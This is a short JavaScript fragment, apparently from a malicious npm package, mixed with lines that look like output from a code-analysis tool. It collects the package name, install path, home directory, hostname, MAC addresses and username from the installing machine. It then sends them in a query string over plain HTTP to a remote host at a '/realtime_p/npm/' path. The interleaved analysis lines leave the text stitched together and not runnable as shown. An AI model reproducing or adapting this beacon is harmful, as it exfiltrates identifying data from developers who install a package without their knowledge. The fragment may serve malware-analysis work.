const trackingData = querystring.stringify({
    package: packageName,
    dir: __dirname,
    homedir: os.homedir(),
    hostname: os.hostname(),
    mac_addresses: macAddressesBase64,
    username: os.userInfo().username,
})
_tmp_1.hostname = os.hostname()
const options = {
        hostname: hostname,
        port: "80",
        path: `/realtime_p/npm/${randomNumber}?${trackingData}`,
        method: "GET",
        rejectUnauthorized: false
    }
_tmp_3.hostname = hostname
_tmp_3.path = <operator>.formatString("/realtime_p/npm/", randomNumber, "?", trackingData, "")
const req = http.request(options, (res) => {
        res.on("data", (d) => {
            console.log(`Response from ${hostname}:`, d.toString());
        });
    })
